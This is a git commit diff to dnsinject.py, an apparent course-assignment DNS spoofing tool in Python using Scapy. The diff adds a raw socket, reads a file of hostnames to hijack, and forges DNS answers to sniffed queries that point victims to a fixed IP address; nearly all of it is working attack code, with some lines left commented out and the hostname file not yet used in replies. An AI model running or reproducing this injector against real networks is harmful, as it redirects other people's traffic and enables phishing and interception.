973a672bf7444962fac80c8b8c8be7b27b553ae2
Michael Salerno <michael.j.salerno@stonybrook.edu>
2016-05-03 01:33:28 -0400

    it works :D

--- dnsinject.py
+++ dnsinject.py
@@ -1,9 +1,16 @@
 #!/usr/bin/env python
 from scapy.all import *
 import argparse
+import socket
 
 from scapy.layers.dns import DNSQR, DNS, DNSRR
 from scapy.layers.inet import IP, UDP
+
+
+hosts = {}
+s = None
+
+conf
 
 
 def id_generator(size=6, chars=string.ascii_lowercase):
@@ -11,22 +18,46 @@ def id_generator(size=6, chars=string.ascii_lowercase):
 
 
 def dns_spoof(pkt):
-    if pkt.dport == 53:
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
-        send(spoofed_pkt)
+    if pkt.dport == 53 and UDP in pkt and DNSRR not in pkt:
+        # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+        #                   UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+        #                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
+        #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
+
+
+        # spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
+        #               UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+        #               DNS(id=pkt[DNS].id, qr=1, rd=1, ra=1, qd=pkt[DNS].qd, \
+        #                   an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata='6.6.6.6'))
+
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
+                  / UDP(dport=pkt[UDP].sport, sport=53) \
+                  / DNS(id=pkt[DNS].id,
+                        qr=1L,
+                        qd=DNSQR(qname=pkt[DNSQR].qname),
+                        an=DNSRR(rrname=pkt[DNS].qd.qname, rdata='98.138.253.109')
+                )
+
+        #del spoofed_pkt[IP].len
+        #del spoofed_pkt[UDP].len
+        #del spoofed_pkt[UDP].chksum
+
+        print('opcode = ' + str(spoofed_pkt[DNS].opcode))
+        #send(spoofed_pkt)
+        print 'sending to: ' + pkt[IP].src
+        sent=s.sendto(str(spoofed_pkt), (pkt[IP].src, pkt[UDP].sport))
+        print sent
         print('injected')
 
 
 def main():
+    global s
     parser = argparse.ArgumentParser(description='DNS spoofer.')
 
     parser.add_argument('-i', help='Listen on network device <interface> (e.g., eth0). If not specified,\
                         dnsinject should select a default interface to listen on. The same\
                         interface should be used for packet injection.', type=str,
-                        required=False, default='wlp1s0')
+                        required=False, default=None)
 
     parser.add_argument('-f', help="Read a list of IP address and hostname pairs specifying the hostnames to\
                         be hijacked. If '-f' is not specified, dnsinject should forge replies for\
@@ -44,9 +75,19 @@ def main():
     if args.f is not None:
         f = open(args.f, 'r')
         for line in f:
-            print(line)
+            line = line.split()
+            if len(line) != 2:
+                continue
+            hosts[line[0].strip()] = line[1].strip()
 
         f.close()
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        print 'got raw socket'
+    except socket.error, msg:
+        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
+        sys.exit()
 
     sniff(iface=args.i, filter=args.expression, prn=dns_spoof, lfilter=lambda x: x.haslayer(DNSQR))
 
